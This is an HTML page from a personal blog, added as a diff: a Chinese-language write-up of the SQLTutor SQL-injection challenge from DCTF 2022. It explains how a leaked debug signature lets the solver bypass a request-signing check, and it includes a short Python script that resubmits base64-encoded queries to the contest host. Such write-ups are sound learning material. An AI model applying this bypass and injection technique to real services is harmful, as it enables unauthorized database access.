@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="paixiaoxing">
+    
+    <title>
+        
+            Dctf比赛web复现 |
+        
+        paixiaoxing&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/paidaxing.jpg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/paidaxing.jpg","favicon":"/images/paidaxing.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"“请用绝对的理智压制不该有的情绪。”"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/paidaxing.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+                paixiaoxing&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Dctf比赛web复现</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/paidaxing.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">paixiaoxing</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-04-18 10:16:30</span>
+        <span class="mobile">2022-04-18 10:16</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Dctf2022/">Dctf2022</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="Dctf比赛web复现"><a href="#Dctf比赛web复现" class="headerlink" title="Dctf比赛web复现"></a>Dctf比赛web复现</h1><h2 id="SQLTutor"><a href="#SQLTutor" class="headerlink" title="SQLTutor"></a>SQLTutor</h2><p>一个经典的sql注入题目，页面上的信息都是垃圾信息没什么用的（在比赛的时候我居然在这里就卡住了，还是太菜）</p>
+<p>可以先随便写入一些内容然后抓包查看</p>
+<p><img src="/2022/04/18/Dctf%E6%AF%94%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
+<p>发现他返回状态码是ok，而且是将我们输入的内容进行了base64编码之后上传上去的</p>
+<p>看看直接注入闭合或者是查询语句会怎么阳</p>
+<p><img src="/2022/04/18/Dctf%E6%AF%94%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/2.png" alt="1"></p>
+<p>发现报错了</p>
+<p>测试发现在输入正确内容之后</p>
+<p>点击forwoard看一下传输过去</p>
+<p><img src="/2022/04/18/Dctf%E6%AF%94%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/3.png" alt="1"></p>
+<p>在页面检测完成之后会接着继续发送一个包</p>
+<p>发送发现我们输入的查询语句，这应该就是我们需要注入的地方饿了</p>
+<p>看了一下回显的内容发现我们在这里的语句被拼接到了服务器当中，那么刚刚第一个页面应该是在服务器前端的测试过滤，如果没有检测到，那么就返回正常，将我们的语句拼接到现在的这个包中，然后上传给数据库进行查询。</p>
+<p>那么流程搞清楚了，那么我们是否可以直接跳过第一步检测，直接发送我们想要的内容来查询呢</p>
+<p>直接构造测试语句<code>&#39;order by 5 -- </code>base64编码一下放入text中测试一下</p>
+<p>发现弹出一个<code>message:Invalid text signature, this incident will be reported!</code></p>
+<p>签名无效，纳闷我先现在需要知道的就是去构造这个签名</p>
+<p>当我们输入任意签名的时候发现在最下面的判断语句：</p>
+<pre><code> ![1](Dctf比赛web复现/5.png)
+</code></pre>
+<p>发现他将我们自己设置的签名，与应该的签名进行了比较，那么我们就可以拿到我们在输入测试内容时应该输入的签名</p>
+<p><img src="/2022/04/18/Dctf%E6%AF%94%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/6.png" alt="1"></p>
+<p>测试成功！</p>
+<p>那么也就是我们需要构造两次上传，第一次需要虚拟签名，拿到真实签名然后构造这个签名上传我们需要的查询语句</p>
+<p>之后就是写脚本直接查询了</p>
+<p>发现flag在当前库下的flag表中直接拿就好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url= <span class="string">&quot;https://sqltutor.dragonsec.si/execute&quot;</span></span><br><span class="line">payload =<span class="string">&quot;&quot;&quot;查询语句&quot;&quot;&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">encoded=base64.b64encode(payload).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;text&quot;</span>:encoded,</span><br><span class="line"><span class="string">&quot;signature&quot;</span>:<span class="string">&quot;paixiaoxing&quot;</span>,</span><br><span class="line"><span class="string">&quot;queryNo&quot;</span>:<span class="string">&quot;0&quot;</span>,</span><br><span class="line"><span class="string">&quot;debug&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">io= requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">resp=io.text</span><br><span class="line">signature= resp.split(<span class="string">&#x27;&quot;compare&quot;:&quot;&#x27;</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">40</span>]<span class="comment">#拿到签名</span></span><br><span class="line">data[<span class="string">&quot;signature&quot;</span>]=signature<span class="comment">#签名覆盖</span></span><br><span class="line">io2 = requests.post(url,data)</span><br><span class="line"><span class="built_in">print</span>(io2.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/18/Dctf%E6%AF%94%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/4.png" alt="1"></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Dctf比赛web复现</li>
+        <li>Post author：paixiaoxing</li>
+        <li>Create time：2022-04-18 10:16:30</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2022/04/18/Dctf比赛web复现/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Dctf2022/">#Dctf2022</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/04/19/tamuctf%E5%A4%8D%E7%8E%B0/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">tamuctf复现</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/04/15/SCTF2019-Flag-Shop/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">SCTF2019-Flag_Shop</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">paixiaoxing</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Dctf%E6%AF%94%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">Dctf比赛web复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLTutor"><span class="nav-number">1.1.</span> <span class="nav-text">SQLTutor</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
